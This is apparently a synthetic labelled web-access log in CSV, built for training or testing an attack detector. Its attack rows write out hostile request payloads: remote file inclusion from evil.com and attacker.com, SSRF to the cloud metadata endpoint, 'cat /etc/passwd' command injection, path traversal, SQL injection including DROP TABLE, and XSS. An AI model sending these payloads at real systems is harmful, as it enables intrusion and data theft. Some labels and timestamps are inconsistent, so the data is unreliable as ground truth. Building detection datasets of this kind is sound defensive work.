logged_at,client_ip,method,url,status_code,user_agent,is_attack,attack_type,logged_at.1,ua_family,referrer
2025-05-13T21:46:06+09:00,10.0.0.124,POST,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,200,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),True,ssrf_rfi,2025-05-03T12:53:53+09:00,crawler,-
2025-05-05T07:24:20+09:00,10.0.0.59,POST,/comment?msg=<script>alert('x')</script>,500,sqlmap/1.7#stable,True,xss,2025-05-06T17:55:00+09:00,pentest_tool,https://google.com/search?q=example
2025-05-07T13:37:20+09:00,10.0.0.16,GET,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html),True,xss,2025-05-07T21:23:33+09:00,crawler,-
2025-05-12T16:47:45+09:00,192.168.0.76,POST,/css/style.css,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-07T08:12:06+09:00,mobile_browser,-
2025-05-02T17:24:19+09:00,192.168.0.117,POST,/signup,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",False,normal,2025-05-07T19:32:15+09:00,browser,https://www.facebook.com/
2025-05-02T08:07:56+09:00,192.168.0.239,POST,/,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-04T17:23:19+09:00,mobile_browser,https://twitter.com/
2025-05-08T09:49:17+09:00,10.0.0.169,POST,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,wget/1.9,True,xss,2025-05-05T12:46:54+09:00,script,-
2025-05-01T13:55:03+09:00,10.0.0.237,BADTLS,/about,500,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",False,normal,2025-05-04T11:50:40+09:00,browser,-
2025-05-01T13:46:50+09:00,10.65.91.241,POST,/login?username=user797&password=pass7619,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",False,normal,2025-05-01T13:46:50+09:00,browser,-
2025-05-06T22:58:38+09:00,10.0.0.143,POST,/search?q=<script>alert('x')</script>,200,OWASP ZAP,True,xss,2025-05-01T20:43:25+09:00,pentest_tool,-
2025-05-09T07:53:07+09:00,10.0.0.49,GET,/login,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Edge/105.0,False,normal,2025-05-06T06:41:26+09:00,browser,https://twitter.com/
2025-05-13T07:36:56+09:00,17.226.157.30,GET,/,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-13T12:59:14+09:00,browser,-
2025-05-01T16:38:49+09:00,172.16.0.94,GET,/search?q=shoes,200,python-requests/2.85,False,normal,2025-05-07T12:57:12+09:00,script,-
2025-05-08T03:34:58+09:00,254.146.64.150,GET,/images/../../../etc/passwd,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),True,directory_traversal,2025-05-09T15:29:42+09:00,browser,-
2025-05-03T21:21:47+09:00,10.0.0.133,GET,/search?q=<script>alert('x')</script>,200,Nessus v10.5,True,xss,2025-05-06T22:13:28+09:00,pentest_tool,-
2025-05-09T17:53:28+09:00,192.168.0.142,GET,/products,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",False,normal,2025-05-01T12:26:27+09:00,browser,https://example.com/prev
2025-05-11T17:45:05+09:00,192.168.0.167,POST,/products/4.html?page=4,302,curl/8.2,False,normal,2025-05-02T12:43:19+09:00,script,https://twitter.com/
2025-05-09T20:35:18+09:00,192.168.0.139,POST,/api/v1/user/35,200,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),False,normal,2025-05-05T14:20:06+09:00,crawler,-
2025-05-14T23:01:24+09:00,91.123.80.172,GET,/static/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-12T03:30:33+09:00,browser,-
2025-05-03T12:15:08+09:00,192.168.0.174,POST,/products/4.html,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0,False,normal,2025-05-04T15:59:14+09:00,browser,https://twitter.com/
2025-05-10T17:07:38+09:00,60.140.68.79,GET,/api/login?username=user&password=secret,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-09T00:04:02+09:00,browser,-
2025-05-01T15:33:54+09:00,192.168.0.102,POST,/login,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",False,normal,2025-05-01T20:09:30+09:00,browser,https://twitter.com/
2025-05-01T22:43:15+09:00,10.0.0.60,GET,/../../../../etc/passwd,500,Nessus v10.5,True,directory_traversal,2025-05-01T13:02:42+09:00,pentest_tool,-
2025-05-04T13:54:06+09:00,10.0.0.243,POST,/search?q=<script>alert('x')</script>,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0,True,sql_injection,2025-05-02T15:30:30+09:00,browser,-
2025-05-08T16:57:29+09:00,10.0.0.157,POST,/load?file=http://evil.com/shell.txt,403,BurpSuite Community/2025.4,True,ssrf_rfi,2025-05-06T22:40:31+09:00,pentest_tool,-
2025-05-01T00:08:29+09:00,192.168.0.81,POST,/,200,Twitterbot/1.0,False,normal,2025-05-03T21:12:28+09:00,crawler,-
2025-05-14T01:50:03+09:00,28.213.226.124,GET,/about,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-03T16:07:24+09:00,browser,-
2025-05-05T07:16:44+09:00,192.168.0.147,GET,/css/style.css?page=3,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Edge/108.0,False,normal,2025-05-02T11:17:19+09:00,browser,https://example.com/prev
2025-05-05T12:49:22+09:00,10.0.0.132,POST,/ping%3Fhost%3D8.8.8.8%3Bcat%2B/etc/passwd,200,python-requests/2.95,True,command_injection,2025-05-03T11:32:47+09:00,script,https://google.com/search?q=example
2025-05-08T07:58:53+09:00,192.168.0.207,GET,/,200,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),False,normal,2025-05-02T19:59:05+09:00,crawler,https://example.com/prev
2025-05-02T00:58:02+09:00,192.168.0.189,POST,/about,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Edge/104.0,False,normal,2025-05-04T14:54:48+09:00,browser,https://google.com/search?q=example
2025-05-09T19:32:12+09:00,185.25.175.246,GET,/download?file=..%2F..%2F..%2Fetc%2Fhosts,403,Mozilla/5.0 (X11; Linux x86_64),True,directory_traversal,2025-05-07T05:00:18+09:00,browser,-
2025-05-10T00:41:10+09:00,10.0.0.34,GET,/product%253Fid%253D10%253BDROP%2520TABLE%2520users,200,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),True,sql_injection,2025-05-02T23:50:53+09:00,crawler,-
2025-05-08T13:36:54+09:00,192.168.0.254,GET,/products/4.html,200,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-01T12:40:55+09:00,mobile_browser,-
2025-05-11T15:39:35+09:00,192.168.0.161,GET,/js/app.js,302,DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html),False,normal,2025-05-02T09:01:21+09:00,crawler,https://google.com/search?q=example
2025-05-08T13:05:32+09:00,10.0.0.13,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,404,wget/1.9,True,xss,2025-05-03T07:56:47+09:00,script,https://google.com/search?q=example
2025-05-10T00:06:08+09:00,21.181.194.225,POST,/about,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-14T22:28:18+09:00,browser,https://example.com/
2025-05-01T22:41:01+09:00,10.0.0.163,POST,/load?file=http://evil.com/shell.txt,500,OWASP ZAP,True,ssrf_rfi,2025-05-05T18:22:36+09:00,pentest_tool,-
2025-05-03T15:02:26+09:00,192.168.0.174,POST,/js/app.js?page=5,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-05T12:27:53+09:00,mobile_browser,https://google.com/search?q=example
2025-05-13T09:07:50+09:00,192.168.0.210,GET,/products,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-06T15:42:42+09:00,crawler,https://twitter.com/
2025-05-10T09:54:43+09:00,10.0.0.83,POST,/login?page=2,200,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),False,normal,2025-05-02T16:54:36+09:00,crawler,-
2025-05-01T07:42:01+09:00,192.168.0.16,POST,/search?q=shoes,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0,False,normal,2025-05-03T18:45:10+09:00,browser,https://www.facebook.com/
2025-05-02T07:41:44+09:00,192.168.0.93,GET,/login,200,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),False,normal,2025-05-03T08:16:21+09:00,crawler,https://twitter.com/
2025-05-09T00:41:42+09:00,10.0.0.107,POST,/comment?msg=<script>alert('x')</script>,200,Metasploit/6.4,True,xss,2025-05-01T18:27:43+09:00,pentest_tool,-
2025-05-04T17:14:14+09:00,192.168.0.160,GET,/api/v1/user/35?page=3,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0,False,normal,2025-05-04T08:17:39+09:00,browser,-
2025-05-01T17:52:54+09:00,192.168.0.46,GET,/about?page=3,304,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-07T17:07:40+09:00,mobile_browser,-
2025-05-12T21:54:08+09:00,10.0.0.159,GET,/../../../../etc/passwd,200,curl/8.5,True,directory_traversal,2025-05-07T13:07:26+09:00,script,https://google.com/search?q=example
2025-05-10T08:05:30+09:00,32.254.149.132,BADTLS,\x16\x03\x01\x00\8f\x01\x00…,400,-,True,tls_probe,2025-05-09T09:34:15+09:00,pentest_tool,-
2025-05-07T12:09:26+09:00,192.168.0.255,POST,/login?page=4,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0,False,normal,2025-05-06T20:14:17+09:00,browser,https://www.facebook.com/
2025-05-08T01:06:02+09:00,10.175.156.178,GET,/api/items?id=65&sort=asc,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",False,normal,2025-05-08T01:06:02+09:00,browser,https://example.com/
2025-05-14T01:22:08+09:00,218.88.10.80,GET,/login.php?username=admin' OR '1'='1'--,200,sqlmap/1.7.4#stable,True,sql_injection,2025-05-07T11:25:19+09:00,pentest_tool,-
2025-05-09T17:48:38+09:00,10.0.0.167,GET,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,OWASP ZAP,True,xss,2025-05-06T18:04:07+09:00,pentest_tool,https://google.com/search?q=example
2025-05-13T20:58:40+09:00,10.0.0.102,GET,/admin/backup%3Ffile%3Dconfig%3Becho%2Bx,200,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),True,command_injection,2025-05-02T09:47:57+09:00,crawler,https://bing.com/search?q=foo
2025-05-07T00:49:17+09:00,10.0.0.24,GET,/search?q=%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Edge/107.0,True,xss,2025-05-05T12:23:13+09:00,browser,https://google.com/search?q=example
2025-05-09T04:40:06+09:00,47.26.158.163,GET,/about,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-13T02:59:40+09:00,browser,-
2025-05-01T00:21:32+09:00,237.30.197.234,POST,/api/login?username=user&password=secret,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-07T05:34:50+09:00,browser,-
2025-05-06T15:43:06+09:00,192.168.0.28,POST,/products/4.html?page=1,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0,False,normal,2025-05-03T14:02:35+09:00,browser,https://google.com/search?q=example
2025-05-05T15:16:25+09:00,10.0.0.239,GET,/proxy%3Furl%3Dhttp%3A//169.254.169.254/latest/meta-data/,403,python-requests/2.15,True,ssrf_rfi,2025-05-06T15:59:20+09:00,script,-
2025-05-06T17:18:59+09:00,10.0.0.51,POST,/ping%253Fhost%253D8.8.8.8%253Bcat%252B/etc/passwd,200,Nessus v10.5,True,command_injection,2025-05-01T20:19:59+09:00,pentest_tool,-
2025-05-12T16:16:30+09:00,10.138.27.249,GET,/products?page=3,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",False,normal,2025-05-12T16:16:30+09:00,browser,https://search.example.com?q=shoes
2025-05-06T17:20:48+09:00,192.168.0.126,GET,/search?q=shoes,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0,False,normal,2025-05-05T15:13:08+09:00,browser,-
2025-05-02T01:26:26+09:00,10.0.0.171,GET,/../../../../etc/passwd,500,BurpSuite Community/2025.4,True,directory_traversal,2025-05-05T14:30:15+09:00,pentest_tool,-
2025-05-06T15:09:39+09:00,10.0.0.145,GET,/../../../../etc/passwd,403,sqlmap/1.7#stable,True,directory_traversal,2025-05-02T13:54:53+09:00,pentest_tool,-
2025-05-05T03:04:32+09:00,101.208.112.70,GET,/load?file=http://attacker.com/evil.php,502,curl/7.68.0,True,ssrf_rfi,2025-05-03T09:20:13+09:00,script,-
2025-05-07T01:03:30+09:00,192.168.0.85,GET,/signup?page=5,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-06T07:35:59+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-02T22:32:21+09:00,10.0.0.187,POST,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,500,wpscan/3.8.23,True,ssrf_rfi,2025-05-07T11:20:24+09:00,pentest_tool,-
2025-05-09T17:14:28+09:00,192.168.0.82,POST,/product?id=10;DROP TABLE users,500,curl/8.7,True,sql_injection,2025-05-07T14:30:52+09:00,script,-
2025-05-09T17:47:12+09:00,172.16.0.228,POST,/about,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0,False,normal,2025-05-06T12:35:11+09:00,browser,https://example.com/prev
2025-05-01T08:55:44+09:00,192.168.0.96,POST,/js/app.js,200,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),False,normal,2025-05-05T15:16:05+09:00,crawler,https://twitter.com/
2025-05-03T07:46:06+09:00,192.168.0.200,GET,/search?q=shoes,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-07T11:23:18+09:00,mobile_browser,https://google.com/search?q=example
2025-05-09T22:53:38+09:00,83.88.29.228,BADTLS,%255Cx16%255Cx03%255Cx01%255Cx00%255Cx82%255Cx01%255Cx00...,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0,True,tls_probe,2025-05-06T19:18:42+09:00,browser,-
2025-05-01T17:43:02+09:00,126.253.238.93,GET,/static/js/app.js,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-08T18:07:07+09:00,browser,https://example.com/
2025-05-01T19:28:12+09:00,118.6.125.254,GET,/static/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-04T07:05:22+09:00,browser,https://example.com/
2025-05-02T00:04:51+09:00,10.0.0.215,GET,/login.php?username=admin' OR '1'='1'--&password=pw,404,BurpSuite Community/2025.4,True,sql_injection,2025-05-06T11:21:11+09:00,pentest_tool,-
2025-05-07T16:00:15+09:00,10.0.0.104,POST,/product%253Fid%253D10%253BDROP%2520TABLE%2520users,404,wget/1.8,True,sql_injection,2025-05-02T10:35:45+09:00,script,-
2025-05-03T20:21:48+09:00,192.168.0.139,POST,/css/style.css,200,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),False,normal,2025-05-01T07:41:03+09:00,crawler,https://www.facebook.com/
2025-05-02T16:57:53+09:00,10.0.0.92,GET,/search?q=<script>alert('x')</script>,500,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0,True,xss,2025-05-01T12:43:55+09:00,browser,-
2025-05-03T04:04:32+09:00,238.59.108.75,GET,/about,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-03T15:18:02+09:00,browser,https://example.com/
2025-05-12T01:24:57+09:00,192.168.0.66,GET,/products/4.html?page=4,500,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-07T08:41:27+09:00,mobile_browser,https://twitter.com/
2025-05-10T07:41:26+09:00,86.209.70.245,BADTLS,\x16\x03\x01\x00\d9\x01\x00…,400,-,True,tls_probe,2025-05-01T13:50:12+09:00,pentest_tool,-
2025-05-02T08:07:18+09:00,10.0.0.24,POST,/proxy%3Furl%3Dhttp%3A//169.254.169.254/latest/meta-data/,403,curl/8.8,True,ssrf_rfi,2025-05-03T09:44:09+09:00,script,-
2025-05-07T02:38:33+09:00,63.3.75.36,GET,/product?id=5 OR 1=1;--,200,Mozilla/5.0,True,sql_injection,2025-05-06T14:16:22+09:00,browser,-
2025-05-01T13:47:14+09:00,14.122.246.217,GET,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-11T09:58:38+09:00,browser,https://example.com/
2025-05-04T17:28:12+09:00,227.61.95.128,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,403,Nessus v10.5,True,tls_probe,2025-05-03T16:20:26+09:00,pentest_tool,-
2025-05-07T21:55:57+09:00,192.168.0.248,POST,/css/style.css,200,curl/7.7,False,normal,2025-05-03T07:32:42+09:00,script,https://google.com/search?q=example
2025-05-04T16:34:13+09:00,35.141.76.85,GET,/load?file=http://attacker.com/evil.php,502,sqlmap/1.7.4#stable,True,ssrf_rfi,2025-05-14T12:32:21+09:00,script,-
2025-05-04T08:06:30+09:00,192.168.0.225,POST,/login,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0,False,normal,2025-05-05T21:46:40+09:00,browser,https://www.facebook.com/
2025-05-01T01:36:56+09:00,10.0.0.118,POST,/proxy?url=http://169.254.169.254/latest/meta-data/,403,sqlmap/1.7#stable,True,ssrf_rfi,2025-05-07T21:02:25+09:00,pentest_tool,-
2025-05-13T07:51:37+09:00,192.168.0.75,GET,/home,302,"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-07T12:29:01+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-12T13:17:53+09:00,10.0.0.203,POST,/ping?host=8.8.8.8;cat+/etc/passwd,404,OWASP ZAP,True,command_injection,2025-05-03T13:21:17+09:00,pentest_tool,-
2025-05-01T07:31:36+09:00,168.120.110.59,GET,/api/login?username=user&password=secret,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-07T01:01:37+09:00,browser,-
2025-05-06T01:51:53+09:00,10.0.0.37,POST,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,200,Nikto/2.1.6 (Evasions:none),True,ssrf_rfi,2025-05-06T16:48:02+09:00,pentest_tool,-
2025-05-10T12:55:47+09:00,192.168.0.213,POST,/api/v1/user/35,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-06T12:28:03+09:00,mobile_browser,https://twitter.com/
2025-05-09T22:53:03+09:00,121.246.50.94,POST,/diag/ping?host=127.0.0.1;cat+/etc/passwd,500,sqlmap/1.7.4#stable,True,command_injection,2025-05-06T14:16:31+09:00,script,-
2025-05-12T15:05:15+09:00,10.0.0.191,BADTLS,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0,False,normal,2025-05-01T20:41:44+09:00,browser,https://twitter.com/
2025-05-14T15:30:11+09:00,10.0.0.198,GET,/ping?host=8.8.8.8;cat+/etc/passwd,403,Nikto/2.1.6 (Evasions:none),True,command_injection,2025-05-01T12:34:38+09:00,pentest_tool,-
2025-05-10T13:34:50+09:00,10.134.57.192,GET,/api/items?id=68&sort=asc,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",False,normal,2025-05-10T13:34:50+09:00,browser,https://example.com/
2025-05-10T07:07:24+09:00,10.0.0.237,POST,/login.php?username=admin' OR '1'='1'--&password=pw,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0,True,sql_injection,2025-05-02T15:23:30+09:00,browser,-
2025-05-10T08:24:41+09:00,10.0.0.133,POST,/proxy?url=http://169.254.169.254/latest/meta-data/,500,python-requests/2.20,True,ssrf_rfi,2025-05-02T23:13:22+09:00,script,-
2025-05-13T23:09:09+09:00,105.92.254.47,GET,/about,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-05T17:24:03+09:00,browser,-
2025-05-10T22:06:25+09:00,192.168.1.246,GET,/login,302,"Mozilla/5.0 (Linux; Android 9; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36",False,normal,2025-05-02T20:26:40+09:00,mobile_browser,https://twitter.com/
2025-05-03T15:05:26+09:00,10.0.0.209,GET,/comment?msg=<script>alert('x')</script>,403,python-requests/2.35,True,xss,2025-05-01T22:41:20+09:00,script,-
2025-05-07T13:56:51+09:00,10.0.0.97,GET,/login.php%3Fusername%3Dadmin%27%20OR%20%271%27%3D%271%27--%26password%3Dpw,200,sqlmap/1.7#stable,True,sql_injection,2025-05-05T16:50:17+09:00,pentest_tool,-
2025-05-02T12:22:43+09:00,10.90.102.7,GET,/api/items?id=55&sort=asc,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",False,normal,2025-05-02T12:22:43+09:00,browser,-
2025-05-07T17:04:30+09:00,10.209.28.223,PRI,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,500,-,True,tls_probe,2025-05-07T17:04:30+09:00,unknown,-
2025-05-09T00:20:16+09:00,192.168.0.101,POST,/products/4.html,200,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-01T17:20:11+09:00,mobile_browser,-
2025-05-11T09:13:20+09:00,192.168.0.32,GET,/products/4.html,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Edge/102.0,False,normal,2025-05-01T22:42:20+09:00,browser,https://bing.com/search?q=foo
2025-05-10T13:07:47+09:00,10.0.0.16,POST,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,Nikto/2.1.6 (Evasions:none),True,xss,2025-05-05T18:16:53+09:00,pentest_tool,https://google.com/search?q=example
2025-05-14T12:01:17+09:00,10.0.0.26,POST,/proxy?url=http://169.254.169.254/latest/meta-data/,403,Nikto/2.1.6 (Evasions:none),True,ssrf_rfi,2025-05-06T17:23:02+09:00,pentest_tool,-
2025-05-12T01:03:19+09:00,173.29.136.59,GET,/static/js/app.js,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-06T07:50:14+09:00,browser,https://example.com/
2025-05-06T07:39:00+09:00,10.0.0.26,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),True,xss,2025-05-07T12:39:54+09:00,crawler,-
2025-05-08T00:56:59+09:00,168.0.95.100,GET,/images/../../../etc/passwd,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,directory_traversal,2025-05-10T22:38:13+09:00,browser,-
